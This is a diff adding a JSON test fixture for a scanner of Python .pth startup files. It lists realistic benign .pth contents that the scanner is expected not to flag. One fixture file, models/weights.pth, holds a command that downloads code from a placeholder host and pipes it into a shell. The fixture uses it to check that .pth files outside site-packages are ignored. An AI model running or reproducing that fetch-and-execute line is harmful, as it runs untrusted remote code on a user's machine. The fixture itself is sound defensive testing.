@@ -1,0 +1,28 @@
+{
+  "why": "Most Python environments hold several .pth files, and nearly all of them run code: virtualenv's, setuptools' distutils shim, an editable install's finder, a namespace package's long one-liner, pytest-cov's exec. Reporting any of them would put a review line on every Python developer's machine. A project's .venv is read even though the walk never enters it. And a .pth outside site-packages is not run by anything; PyTorch saves models with the extension, so it is not even read.",
+  "roots": [
+    "code"
+  ],
+  "files": {
+    "code/proj/.venv/lib/python3.12/site-packages/_virtualenv.pth": "import _virtualenv\n",
+    "code/proj/.venv/lib/python3.12/site-packages/distutils-precedence.pth": "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n",
+    "code/proj/.venv/lib/python3.12/site-packages/__editable__.proj-0.1.0.pth": "import __editable___proj_0_1_0_finder; __editable___proj_0_1_0_finder.install()\n",
+    "code/proj/.venv/lib/python3.12/site-packages/google_auth-2.0.0-py3.12-nspkg.pth": "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));importlib = has_mfs and __import__('importlib.util');has_mfs and __import__('importlib.machinery');m = has_mfs and sys.modules.setdefault('google', importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec('google', [os.path.dirname(p)])));m = m or sys.modules.setdefault('google', types.ModuleType('google'));mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)\n",
+    "code/proj/.venv/lib/python3.12/site-packages/pytest-cov.pth": "import os, sys;exec('if \\'COV_CORE_SOURCE\\' in os.environ:\\n  try:\\n    from pytest_cov.embed import init\\n    init()\\n  except Exception as exc:\\n    sys.stderr.write(\"pytest-cov: Failed to setup subprocess coverage.\")\\n')\n",
+    "code/proj/.venv/lib/python3.12/site-packages/proj.pth": "/home/dev/code/proj/src\n",
+    "code/proj/models/weights.pth": "import os;os.system('curl http://example.invalid | sh')\n"
+  },
+  "expect": {
+    "exit": 0,
+    "findings": [
+      {
+        "level": "ok",
+        "match": "6 Python startup files (.pth) checked, none runs anything unusual"
+      }
+    ],
+    "must_not_report": [
+      "[HIT]",
+      "[review]"
+    ]
+  }
+}
